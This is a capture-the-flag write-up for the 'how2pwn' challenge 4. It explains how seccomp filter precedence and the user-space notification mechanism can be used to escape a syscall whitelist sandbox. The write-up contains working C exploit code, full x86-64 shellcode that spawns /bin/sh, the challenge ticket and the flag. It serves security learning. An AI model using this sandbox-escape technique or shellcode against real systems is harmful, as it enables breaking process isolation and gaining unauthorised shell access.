# how2pwn - Challenge 4

Categories: Pwn

**Tags:** pwn, shellcode, PIE shellcode, seccomp in-depth

## Takeaways

- How multiple seccomp filters are handled
- seccomp action values precedence
- An example of `seccomp_unotify` - Seccomp user-space notification mechanism
- [seccomp-tools](https://github.com/david942j/seccomp-tools) seem only to dump the first installed seccomp filter, even with `dump --limit=2`.

## Solution

Let's take a look at the source code:

```c
#include <linux/seccomp.h>
#include <unistd.h>
#include <syscall.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stddef.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <sys/mman.h>
void panic(char *s){
    puts(s);
    _exit(1);
}
void checkin(){ 
    // Solved the previous challenge, and find the ticket in "/flag"
    char real_ticket[0x30] = {0};
    char your_ticket[0x30] = {0};
    int f = open("./ticket",0);
    if(f<0)
        panic("[-] Fail to open tickect");
    read(f,real_ticket,0x20);
    read(0,your_ticket,0x20);
    close(f);
    if(strncmp(real_ticket,your_ticket,0x20))
        panic("[-] Wrong Ticket");
    return ; 
}
void init(){
    fclose(stderr);
    setvbuf(stdin,  0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    checkin();
}
void sandbox(){
    // challenge setting
    // This sandbox only allows __NR_seccomp __NR_fork __NR_ioctl __NR_exit
    // and it would trace all other syscalls
    struct sock_filter strict_filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_seccomp, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fork, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ioctl, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
    };
    struct sock_fprog prog = {
        .len = sizeof(strict_filter) / sizeof(strict_filter[0]),
        .filter = strict_filter,
    };
    int ret = 0 ; 
    ret = syscall(__NR_prctl,PR_SET_NO_NEW_PRIVS, 1,0,0,0);
    if(ret!=0)
        panic("[-] PR_SET_NO_NEW_PRIVS FAIL");
    // Apply the filter. 
    ret = syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,0,&prog);
    if(ret!=0)
        panic("[-] SECCOMP_SET_MODE_FILTER FAIL");
    puts("[+] Sandbox On");

}
int main(){
    init();
    // To make exploit script easier, our shellcode would be on 0xcafe000
    char *buf = mmap((void *)0xcafe000,0x1000,7,0x21,0,0);
    if((size_t)buf!=0xcafe000)
        panic("Fail to mmap");
    puts("Enter your shellcode: ");
    read(0, buf, 0x1000);
    void (* p )(); 
    p = (void (*)())buf;
    sandbox();
    p();
    return 1;
}
```

```bash
nikos@ctf-box:~/how2pwn$ checksec --file=./public/bin/all/chal4
[*] '~/how2pwn/public/bin/all/chal4'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

As we can see, in order to solve this challenge we need to first have the ticket from challenge3: `7a01505a0cfefc2f8249cb24e01a2890`. Aside from that, this challenge is similar to the previous ones, but with a few differences:

* We can input `0x1000` bytes of shellcode (instead of `0x100`)
* The shellcode is not placed on the stack and NX is enabled. Instead, the program `mmaps` a RWX region at address `0xcafe000` and places our shellcode there.
* The `sandbox()` function is now invoked before our shellcode - just like in challenge3.

So, let's focus on the `sandbox()` function and try to understand it. As we can see, `sandbox()` sets up a seccomp filter that is now a whitelist instead of a blacklist approach as we saw in challenge 3. Let's also run the program through [seccomp-tools](https://github.com/david942j/seccomp-tools) to dump the constraints in a more friendly UI:

```bash
nikos@ctf-box:~/how2pwn$ seccomp-tools dump ./public/bin/all/chal4
7a01505a0cfefc2f8249cb24e01a2890
Enter your shellcode:
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x0000013d  if (A != seccomp) goto 0003
 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0003: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x15 0x00 0x01 0x00000010  if (A != ioctl) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x7ff00000  return TRACE
```

The only 4 allowed system calls are `seccomp`, `fork`, `ioctl`, and `exit`. Otherwise, the value that results from `SECCOMP_RET_TRACE` is used. Let's read the [manual](https://man7.org/linux/man-pages/man2/seccomp.2.html) about it:

> `SECCOMP_RET_TRACE`
>
> When returned, this value will cause the kernel to attempt to notify a ptrace(2)-based tracer prior to executing the system call.  If there is no tracer present, the system call is not executed and returns a failure status with errno set to ENOSYS. A tracer will be notified if it requests `PTRACE_O_TRACESECCOMP` using `ptrace(PTRACE_SETOPTIONS)`.

However, in our case, the `ptrace` system call is not allowed, so `SECCOMP_RET_TRACE` is the same as `SECCOMP_RET_KILL_PROCESS` for us.

Next, we dig into the `ioctl` system call as it is a very generic one that offers many possibilities. Indeed, we find something interesting; [seccomp_unotify - Seccomp user-space notification mechanism](https://man7.org/linux/man-pages/man2/seccomp_unotify.2.html). Quoting the documentation:

> This page describes the user-space notification mechanism provided by the Secure Computing (seccomp) facility. In conventional usage of a seccomp filter, the decision about how to treat a system call is made by the filter itself. By contrast, the user-space notification mechanism allows the seccomp filter to delegate the handling of the system call to another user-space process.

Okay, this sounds promising to us as `fork` is present in our whitelist.

> In the discussion that follows, the thread(s) on which the seccomp filter is installed is (are) referred to as the ***target***, and the process that is notified by the user-space notification mechanism is referred to as the ***supervisor***.
> 
> [...
> 
> The target establishes a seccomp filter in the usual manner, but with two differences:
> 
> * The seccomp(2) flags argument includes the flag `SECCOMP_FILTER_FLAG_NEW_LISTENER`.  Consequently, the return value of the (successful) seccomp(2) call is a new "listening" file descriptor that can be used to receive notifications.  Only one "listening" seccomp filter can be installed for a thread.
> * In cases where it is appropriate, the seccomp filter returns the action value `SECCOMP_RET_USER_NOTIF`.  This return value will trigger a notification event. [...]

The documentation keeps going on then about how to setup the user notification mechanism. But before we proceed, is says that we should setup a seccomp filter with the above flag. Can we do that? The answer is yes. The `seccomp` syscall is already in the whitelist and the required `prctl(PR_SET_NO_NEW_PRIVS, 1)` has already been invoked by the already installed filter.

But what will happen if we have `>=2` different seccomp filters? The [manual](https://man7.org/linux/man-pages/man2/seccomp.2.html) helps us here again:

> **If multiple filters exist, they are all executed, in reverse order of their addition to the filter tree**—that is, the most recently installed filter is executed first.  (Note that all filters will be called even if one of the earlier filters returns `SECCOMP_RET_KILL`.  This is done to simplify the kernel code and to provide a tiny speed-up in the execution of sets of filters by avoiding a check for this uncommon case.)  **The return value for the evaluation of a given system call is the first-seen action value of highest precedence (along with its accompanying data) returned by execution of all of the filters.**
>
> In decreasing order of precedence, the action values that may be returned by a seccomp filter are:
> 
> * `SECCOMP_RET_KILL_PROCESS`
> * `SECCOMP_RET_KILL_THREAD`
> * `SECCOMP_RET_TRAP`
> * `SECCOMP_RET_ERRNO`
> * `SECCOMP_RET_USER_NOTIF`
> * `SECCOMP_RET_TRACE`
> * `SECCOMP_RET_LOG`
> * `SECCOMP_RET_ALLOW`
> * If an action value other than one of the above is specified, then the filter action is treated as either `SECCOMP_RET_KILL_PROCESS` (since Linux 4.14) or `SECCOMP_RET_KILL_THREAD` (in Linux 4.13 and earlier).

So, if we install a seccomp filter that returns `SECCOMP_RET_USER_NOTIF` for all system calls, this has higher precedence than `SECCOMP_RET_TRACE` and will override the first seccomp filter. Then, by doing a `fork()` and controlling both the  *target* and the *supervisor* processes, we can instruct the supervisor to allow all system calls. One thing to be careful here is that `SECCOMP_RET_ALLOW` has lower precedence than `SECCOMP_RET_USER_NOTIF`. This means that the `SECCOMP_RET_USER_NOTIF` seccomp filter that we will install should only act on the same whitelist.

Let's follow the [manual](https://man7.org/linux/man-pages/man2/seccomp_unotify.2.html) to implement this behavior. To ease exploit development, we will perform this attack first in C. [myebpf.c](myebpf.c) is the same as the challenge's code except that:

1. We have added `write` to the whitelist so that stuff gets printed
2. Instead of reading the shellcode, right after `sandbox()`, we invoke `exploit()`. This function is the payload that we would write in C.

So, here is our `exploit()` function:

```c
void exploit(){
    // installs a seccomp filter that generates user-space notifications (SECCOMP_RET_USER_NOTIF) always
    struct sock_filter strict_filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_seccomp, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fork, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ioctl, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_USER_NOTIF), //originally SECCOMP_RET_TRACE
    };
    struct sock_fprog prog = {
        .len = sizeof(strict_filter) / sizeof(strict_filter[0]),
        .filter = strict_filter,
    };
    // Apply the filter. 
    int ret = syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER	,&prog);
    if(ret < 0)
        panic("[-] SECCOMP_SET_MODE_FILTER FAIL");
    int listening_fd = ret;

    pid_t child = syscall(__NR_fork);
    if(child == 0) {
        //child - supervisor. Still cannot make arbitrary syscalls since it has installed the
        //original seccomp filter
        struct seccomp_notif_sizes sizes;
        ret = syscall(__NR_seccomp,SECCOMP_GET_NOTIF_SIZES,0,&sizes);
        if(ret == -1)
            panic("[-] SECCOMP_GET_NOTIF_SIZES FAIL");

        char notif_buffer [sizes.seccomp_notif];        //type: struct seccomp_notif
        char response_buffer[sizes.seccomp_notif_resp]; //type: struct seccomp_notif_resp

        while(1) {
            memset(notif_buffer, 0, sizes.seccomp_notif);
            memset(response_buffer, 0, sizes.seccomp_notif_resp);

            ret = ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_RECV, notif_buffer);  //blocking
            if(ret != 0)
                panic("[-] SECCOMP_IOCTL_NOTIF_RECV FAIL");

            struct seccomp_notif *notif_req = (struct seccomp_notif*)notif_buffer;
            struct seccomp_notif_resp *notif_resp = (struct seccomp_notif_resp*)response_buffer;

            notif_resp->id = notif_req->id;
            notif_resp->error = 0;
            notif_resp->flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE; //Tell the kernel to execute the target's syscall
            notif_resp->val = 0;
            printf("[monitor] Allowing syscall nr %d\n", notif_req->data.nr);
            ret = ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_SEND, response_buffer);
            if (ret != 0)
                panic("[-] SECCOMP_IOCTL_NOTIF_SEND FAIL");
        }

    } else {
        //parent - target. syscalls are delegated to the supervisor
        close(listening_fd);
        puts("[+] Hacked Sandbox On");
    }
}
```

When we compile and execute the above code ([myebpf.c](myebpf.c)), we see observe the following output:

```bash
nikos@ctf-box:~/how2pwn/challenge4$ ./myebpf
Welcome!
[+] Sandbox On
[monitor] Allowing syscall nr 3
[+] Hacked Sandbox On
[monitor] Allowing syscall nr 231
```

syscall nr 3 is `close` and 231 is `exit_group`. Perfect! We have successfully bypassed the original seccomp filter. Now, let's modify a bit our exploit so that it is closer to the assembly level and closer to our actual target.

1. We will remove the `write` that we added
2. We will minimize the assembly code required

So, our `exploit` function no becomes:

```c
void exploit(){
    // installs a seccomp filter that generates user-space notifications (SECCOMP_RET_USER_NOTIF) always
    struct sock_filter strict_filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_seccomp, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fork, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ioctl, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_USER_NOTIF),
    };
    struct sock_fprog prog = {
        .len = sizeof(strict_filter) / sizeof(strict_filter[0]),
        .filter = strict_filter,
    };
    // Apply the filter. 
    int listening_fd = syscall(
        __NR_seccomp,SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER,&prog
    ); //assume success

    pid_t child = syscall(__NR_fork);
    if(child == 0) {
        //child - supervisor. Still cannot make arbitrary syscalls since it has installed the
        //original seccomp filter
        struct seccomp_notif_sizes sizes;
        syscall(__NR_seccomp,SECCOMP_GET_NOTIF_SIZES,0,&sizes);

        char notif_buffer [sizes.seccomp_notif];        //type: struct seccomp_notif
        char response_buffer[sizes.seccomp_notif_resp]; //type: struct seccomp_notif_resp

        while(1) {
            memset(notif_buffer, 0, sizes.seccomp_notif);
            memset(response_buffer, 0, sizes.seccomp_notif_resp);

            ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_RECV, notif_buffer);  //blocking

            struct seccomp_notif *notif_req = (struct seccomp_notif*)notif_buffer;
            struct seccomp_notif_resp *notif_resp = (struct seccomp_notif_resp*)response_buffer;

            notif_resp->id = notif_req->id;
            notif_resp->error = 0;
            notif_resp->flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE;
            notif_resp->val = 0;
            ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_SEND, response_buffer);
        }
    } else {
        //parent - target. syscalls are delegated to the supervisor
        close(listening_fd);
        syscall(__NR_write, STDOUT_FILENO, "[+] Hacked Sandbox On\n", 22);
    }
}
```

The source code for this version can be found in [myebpf-thin.c](myebpf-thin.c). If we have written our exploit correctly, we expect that the target process will print the message `[+] Hacked Sandbox On` when we run the file [myebpf-thin.c](myebpf-thin.c). The reason why we expect this is is because both `close` and `write` are forbidden syscalls by the original seccomp filter. Our newly installed seccomp filter should allow their execution.

### Shellcode

To produce the shellcode for the above monstrosity, we simple compile the C program, load it in ghidra, copy the assembly, and make changes wherever appropriate:

```python
def craft_shellcode():
    shellcode = asm('''
    ENDBR64
    JMP start

    inline_memset:
    xor rax, rax

    inline_memset_loop:
    cmp rax, rdx
    jz inline_memset_exit
    mov byte ptr [rdi+rax], 0
    inc rax
    jmp inline_memset_loop

    inline_memset_exit:
    ret

    start:
    PUSH       RBP
    MOV        RBP,RSP
    PUSH       R15
    PUSH       R14
    PUSH       R13
    PUSH       R12
    SUB        RSP,0xe0
    
    // ebpf filter
    MOV        qword ptr [RBP + -0x28],RAX
    XOR        EAX,EAX
    MOV        word ptr [RBP + -0x80],0x20
    MOV        byte ptr [RBP + -0x7e],0x0
    MOV        byte ptr [RBP + -0x7d],0x0
    MOV        dword ptr [RBP + -0x7c],0x0
    MOV        word ptr [RBP + -0x78],0x15
    MOV        byte ptr [RBP + -0x76],0x0
    MOV        byte ptr [RBP + -0x75],0x1
    MOV        dword ptr [RBP + -0x74],0x13d
    MOV        word ptr [RBP + -0x70],0x6
    MOV        byte ptr [RBP + -0x6e],0x0
    MOV        byte ptr [RBP + -0x6d],0x0
    MOV        dword ptr [RBP + -0x6c],0x7fff0000
    MOV        word ptr [RBP + -0x68],0x15
    MOV        byte ptr [RBP + -0x66],0x0
    MOV        byte ptr [RBP + -0x65],0x1
    MOV        dword ptr [RBP + -0x64],0x39
    MOV        word ptr [RBP + -0x60],0x6
    MOV        byte ptr [RBP + -0x5e],0x0
    MOV        byte ptr [RBP + -0x5d],0x0
    MOV        dword ptr [RBP + -0x5c],0x7fff0000
    MOV        word ptr [RBP + -0x58],0x15
    MOV        byte ptr [RBP + -0x56],0x0
    MOV        byte ptr [RBP + -0x55],0x1
    MOV        dword ptr [RBP + -0x54],0x10
    MOV        word ptr [RBP + -0x50],0x6
    MOV        byte ptr [RBP + -0x4e],0x0
    MOV        byte ptr [RBP + -0x4d],0x0
    MOV        dword ptr [RBP + -0x4c],0x7fff0000
    MOV        word ptr [RBP + -0x48],0x15
    MOV        byte ptr [RBP + -0x46],0x0
    MOV        byte ptr [RBP + -0x45],0x1
    MOV        dword ptr [RBP + -0x44],0x3c
    MOV        word ptr [RBP + -0x40],0x6
    MOV        byte ptr [RBP + -0x3e],0x0
    MOV        byte ptr [RBP + -0x3d],0x0
    MOV        dword ptr [RBP + -0x3c],0x7fff0000
    MOV        word ptr [RBP + -0x38],0x6
    MOV        byte ptr [RBP + -0x36],0x0
    MOV        byte ptr [RBP + -0x35],0x0
    MOV        dword ptr [RBP + -0x34],0x7fc00000
    MOV        word ptr [RBP + -0x90],0xa
    LEA        RAX,[RBP + -0x80]
    MOV        qword ptr [RBP + -0x88],RAX
    LEA        RAX,[RBP + -0x90]

    // seccomp(SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER	,&prog);
    MOV        RCX,RAX
    MOV        EDX,0x8
    MOV        ESI,0x1
    MOV        EDI,0x13d
    MOV        EAX,0x0
    mov rdi, rsi
    mov rsi, rdx
    mov rdx, rcx
    mov eax, 317
    syscall

    MOV        dword ptr [RBP + -0xd4],EAX
    MOV        EAX,dword ptr [RBP + -0xd4]
    MOV        dword ptr [RBP + -0xd0],EAX

    // fork()
    mov eax, 57
    syscall

    // seccomp(SECCOMP_GET_NOTIF_SIZES,0,&sizes);
    MOV        dword ptr [RBP + -0xcc],EAX
    CMP        dword ptr [RBP + -0xcc],0x0
    JNZ        LAB_001018b1

    /**************** child - monitor process *****************/
    LEA        RAX,[RBP + -0xc6]
    MOV        RCX,RAX
    MOV        EDX,0x0
    MOV        ESI,0x3
    MOV        EDI,0x13d
    mov rdi, rsi
    mov rsi, rdx
    mov rdx, rcx
    mov eax, 317
    syscall

    mov qword ptr [RBP + -0xa8], 0xcafea00 /* notif_buffer */
    mov qword ptr [RBP + -0xb8], 0xcafeb00 /* response_buffer */

    //while(1)
    LAB_001017d3:
    MOV        RDI,qword ptr [RBP + -0xb8]
    xor rsi, rsi
    MOV        RDX,0x400
    call inline_memset

    // ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_RECV, notif_buffer);
    MOV        RDX,qword ptr [RBP + -0xb8]
    MOV        EAX,dword ptr [RBP + -0xd0]
    MOV        ECX,0xc0502100
    MOV        RSI,RCX
    MOV        EDI,EAX
    MOV        EAX,16
    syscall

    //ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_SEND, response_buffer);
    MOV        RAX,qword ptr [RBP + -0xb8]
    MOV        qword ptr [RBP + -0xa0],RAX
    MOV        RAX,qword ptr [RBP + -0xa8]
    MOV        qword ptr [RBP + -0x98],RAX
    MOV        RAX,qword ptr [RBP + -0xa0]
    MOV        RDX,qword ptr [RAX]
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        qword ptr [RAX],RDX
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        dword ptr [RAX + 0x10],0x0
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        dword ptr [RAX + 0x14],0x1
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        qword ptr [RAX + 0x8],0x0
    MOV        RDX,qword ptr [RBP + -0xa8]
    MOV        EAX,dword ptr [RBP + -0xd0]
    MOV        ECX,0xc0182101
    MOV        RSI,RCX
    MOV        EDI,EAX
    MOV        EAX,16
    syscall
    JMP        LAB_001017d3

    /**************** parent - target process *****************/
    LAB_001018b1:

    // close(listening_fd);
    MOV        EDI,EAX
    mov eax, 3
    syscall
    
    //dummy print to verify that the seccomp bypass works
    MOV        EDX,0x16
    mov rax, 0x41424344
    push rax
    mov rsi, rsp
    MOV        EDI,0x1
    mov eax, 1
    syscall
    pop rax

    // SHELLCODEEEEEE
    xor     rdx, rdx
    lea rbx, [rip+binsh]
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    mov     eax, 0x3b
    syscall

    hang:
    jmp hang

    /************* Data section *************/
    binsh:
    .ascii "/bin/sh\\0"

    // exit stuff. probably unnecessary
    POP        R12
    POP        R13
    POP        R14
    POP        R15
    POP        RBP
    RET
    ''')
    
    print(f'Shellcode is {hex(len(shellcode))}/0x1000 bytes long')
    padded_shellcode = shellcode + b'\x90'*(0x1000 - len(shellcode)) # pad with NOPs.
    assert(len(padded_shellcode) == 0x1000)
    return padded_shellcode
```

And when we send our payload, we finally get the flag!!!

`flag{8d13cfa357978684be9809172d3033ce739015f5}`
